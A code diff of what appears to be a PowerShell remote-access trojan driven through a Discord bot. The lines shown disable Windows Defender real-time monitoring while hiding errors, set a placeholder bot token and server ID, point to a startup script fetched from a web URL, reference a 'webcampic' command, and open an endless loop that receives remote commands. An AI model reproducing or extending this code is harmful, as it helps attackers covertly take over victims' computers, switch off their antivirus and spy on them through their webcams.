@@ -1,5 +1,5 @@
 Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
 #your bot token goes here
 #EXAMPLE: $token = "MTA0ODE4MjEwMTA1MTQ2MDM3.AJif8F.9Uod-6ND1QAO38pwPJ7Ishvu5Eb"
@@ -13,6 +13,8 @@ $guildId = "YOUR_DISCORD_SERVER_ID"
 #you can host the file on github (make sure the repository is public)
 #example: $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"
 $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"
+
+
 
 
 
@@ -1107,7 +1109,7 @@ DiscordCommand -DiscordCommandName webcampic
 
 
 Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 #incoming command loop
 while ($true) {
     $headers = @{
